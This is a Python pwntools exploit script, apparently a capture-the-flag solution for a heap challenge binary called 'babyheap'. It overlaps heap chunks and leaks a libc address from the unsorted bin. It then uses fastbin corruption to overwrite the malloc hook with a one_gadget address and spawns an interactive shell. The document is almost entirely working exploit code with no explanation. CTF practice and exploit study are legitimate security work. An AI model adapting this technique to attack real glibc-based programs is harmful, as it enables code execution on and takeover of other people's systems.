from pwn import *

p=process('./babyheap')

def Allocate(size):
    p.sendline('1')
    p.sendlineafter('Size: ',str(size))

def Fill(num,content): 
    p.sendline('2')
    p.sendlineafter('Index: ',str(num))
    p.sendlineafter('Size: ',str(len(content)))
    p.sendlineafter('Content: ',content)

def Free(num):
    p.sendline('3')
    p.sendlineafter('Index: ',str(num))

def Dump(num):
    p.sendline('4')
    p.sendlineafter('Index: ',str(num))

Allocate(0x10) #0
Allocate(0x10) #1
Allocate(0x10) #2
Allocate(0x10) #3
Allocate(0x80) #4
Free(2)
Free(1)
Fill(0,'a'*16+p64(0)+p64(0x21)+p8(0x80))
Fill(3,'a'*16+p64(0)+p64(0x21))
Allocate(0x10)
Allocate(0x10)
Fill(3,'a'*16+p64(0)+p64(0x91))
Allocate(0x80) #5
Free(4)
Dump(2)
p.recvuntil('Content: \n')
unsortedbin=u64(p.recv()[:8])
main_arena_addr=unsortedbin-88
fake_addr=main_arena_addr-0x33
libc_addr=main_arena_addr-0x3c4b20
one_gadget_addr=libc_addr+0x4526a #0x45216 0x4526a 0xf02a4 0xf1147
log.success('libc_addr:'+hex(libc_addr))
log.success('unsorted bin:'+hex(unsortedbin))
log.success('onegadget addr:'+hex(one_gadget_addr))
Allocate(0x60)
Free(4)
Fill(2,p64(fake_addr))
Allocate(0x60)
Allocate(0x60)

Fill(6,'a'*19+p64(one_gadget_addr))
#gdb.attach(p)
#pause()
Allocate(0x60)
p.interactive()
